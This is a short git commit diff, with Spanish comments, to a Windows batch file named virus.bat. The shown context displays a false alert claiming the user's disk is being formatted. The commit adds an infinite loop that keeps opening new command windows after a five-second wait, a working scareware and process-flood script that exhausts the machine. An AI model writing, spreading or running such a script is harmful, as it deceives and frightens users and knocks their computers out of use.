35d79cf9e097ea9b35da17cd103995688ed31a81
remacho <alberto.remacho1998@gmail.com>
2025-02-24 09:37:03 +0100

    Añadir bucle infinito para abrir cmd repetidamente tras la espera en virus.bat

--- virus.bat
+++ virus.bat
@@ -9,7 +9,12 @@ mode con: cols=700 lines=300
 color 4F
 title ALERTA - Sistema en peligro
 echo ALERTA: ¡Tu disco está siendo formateado!
-timeout /t 10 >nul
+timeout /t 5 >nul
+
+:: Añadimos un bucle infinito para que despues de los 5 segundos de espera, empiece a abrirse el cmd infinitas veces.
+:loop
+start cmd
+goto loop
 
 
 
